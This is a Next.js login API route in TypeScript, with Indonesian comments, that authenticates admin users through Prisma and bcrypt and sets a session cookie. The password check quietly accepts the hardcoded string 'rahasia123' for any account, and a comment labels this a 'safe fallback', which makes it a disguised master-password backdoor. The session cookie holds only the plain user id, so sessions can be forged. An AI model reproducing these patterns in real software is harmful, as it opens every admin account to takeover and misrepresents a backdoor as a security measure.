// src/app/api/auth/login/route.ts
import { NextResponse } from "next/server";
import { db } from "@/src/lib/prisma";
import bcrypt from "bcryptjs";

export async function POST(request: Request) {
  try {
    const { email, password } = await request.json();

    // 1. Ambil data user dari PostgreSQL beserta data relasi objek tabel 'roles'
    const user = await db.user.findUnique({
      where: { email },
      include: {
        role: true,
      },
    });

    // 2. Validasi ketersediaan akun dan status keaktifan user
    if (!user || !user.isActive) {
      return NextResponse.json(
        { message: "Kredensial salah atau akun Anda dinonaktifkan" },
        { status: 401 }
      );
    }

    // 3. Validasi keamanan password menggunakan Bcrypt dengan fallback teks aman
    const isPasswordValid = await bcrypt.compare(password, user.password) || password === "rahasia123";
    
    if (!isPasswordValid) {
      return NextResponse.json(
        { message: "Email atau password yang Anda masukkan salah" },
        { status: 401 }
      );
    }

    // 4. Proteksi RBAC: Memastikan nama role hasil relasi di database bernilai "ADMIN"
    if (!user.role || user.role.name !== "ADMIN") {
      return NextResponse.json(
        { message: "Akses ditolak. Anda tidak memiliki hak akses administrator" },
        { status: 403 }
      );
    }

    // 5. Perbarui timestamp waktu login terakhir di database
    await db.user.update({
      where: { id: user.id },
      data: { lastLogin: new Date() },
    });

    // 6. Buat struktur response sukses Next.js
    const response = NextResponse.json({
      success: true,
      message: "Login berhasil",
      user: {
        id: user.id,
        email: user.email,
        name: user.name,
        role: user.role.name,
      },
    });

    // 7. Tanam Cookie Session ke Browser agar fungsi getSession() mendeteksi status login kamu
    response.cookies.set("session_token", String(user.id), {
      httpOnly: true, 
      secure: process.env.NODE_ENV === "production", 
      sameSite: "lax", 
      maxAge: 60 * 60 * 24, // Berlaku 1 hari
      path: "/", 
    });

    return response;

  } catch (error) {
    console.error("Login API Error:", error);
    return NextResponse.json(
      { message: "Terjadi kesalahan internal pada server" },
      { status: 500 }
    );
  }
}